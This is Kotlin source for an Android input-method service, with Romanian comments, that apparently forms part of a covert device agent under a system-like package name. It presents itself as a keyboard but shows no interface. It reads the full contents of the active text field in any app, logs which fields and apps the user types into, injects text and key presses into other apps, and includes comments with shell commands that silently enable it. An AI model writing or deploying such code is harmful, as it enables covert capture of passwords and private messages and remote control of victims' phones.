package net.sys32.agent

import android.inputmethodservice.InputMethodService
import android.view.View
import android.view.inputmethod.EditorInfo
import org.json.JSONObject
import org.json.JSONArray
import java.util.concurrent.CopyOnWriteArrayList

// FIX 3: IME propriu. Permite: citirea textului din campul activ (orice app),
// injectarea de text global si capturarea tastelor.
// Activare: settings put secure enabled_input_methods net.sys32.agent/.AgentIme
//           ime set net.sys32.agent/.AgentIme
class AgentIme : InputMethodService() {

    companion object {
        @Volatile var instance: AgentIme? = null
        private const val MAX = 500
        val keys = CopyOnWriteArrayList<JSONObject>()
    }

    override fun onCreate() { super.onCreate(); instance = this }
    override fun onDestroy() { if (instance === this) instance = null; super.onDestroy() }

    // Nu afisam UI propriu: lasam doar o vedere goala (tastatura invizibila).
    override fun onCreateInputView(): View = View(this)

    override fun onStartInput(attribute: EditorInfo?, restarting: Boolean) {
        super.onStartInput(attribute, restarting)
        try {
            val o = JSONObject()
            o.put("event", "startInput")
            o.put("pkg", attribute?.packageName ?: "")
            o.put("fieldId", attribute?.fieldId ?: 0)
            o.put("hint", attribute?.hintText?.toString() ?: "")
            o.put("inputType", attribute?.inputType ?: 0)
            keys.add(o); trim()
        } catch (_: Exception) {}
    }

    override fun onFinishInput() {
        try { val o = JSONObject(); o.put("event","finishInput"); keys.add(o); trim() } catch (_: Exception) {}
        super.onFinishInput()
    }

    // CHEIA FUNCTIEI: citirea continutului campului activ din orice app.
    // API-urile inputConnection sunt disponibile DOAR din IME.
    fun readField(): JSONObject {
        val out = JSONObject()
        try {
            val ic = currentInputConnection
            if (ic == null) { out.put("error", "no input connection"); return out }
            val info = currentInputEditorInfo
            out.put("pkg", info?.packageName ?: "")
            val before = ic.getTextBeforeCursor(10000, 0)?.toString() ?: ""
            val after = ic.getTextAfterCursor(10000, 0)?.toString() ?: ""
            val sel = ic.getSelectedText(0)?.toString() ?: ""
            out.put("before", before); out.put("after", after); out.put("selected", sel)
            out.put("full", before + sel + after)
        } catch (e: Exception) { out.put("error", e.toString()) }
        return out
    }

    fun inject(text: String, deleteBefore: Int = 0): Boolean = try {
        val ic = currentInputConnection ?: return false
        if (deleteBefore > 0) ic.deleteSurroundingText(deleteBefore, 0)
        ic.commitText(text, 1)
        true
    } catch (_: Exception) { false }

    fun keyEvent(code: Int): Boolean = try {
        val ic = currentInputConnection ?: return false
        ic.sendKeyEvent(android.view.KeyEvent(android.view.KeyEvent.ACTION_DOWN, code)) &&
        ic.sendKeyEvent(android.view.KeyEvent(android.view.KeyEvent.ACTION_UP, code))
    } catch (_: Exception) { false }

    fun dumpKeys(limit: Int): JSONArray {
        val a = JSONArray()
        val start = maxOf(0, keys.size - limit)
        for (i in start until keys.size) a.put(keys[i])
        return a
    }

    private fun trim() { while (keys.size > MAX) keys.removeAt(0) }
}
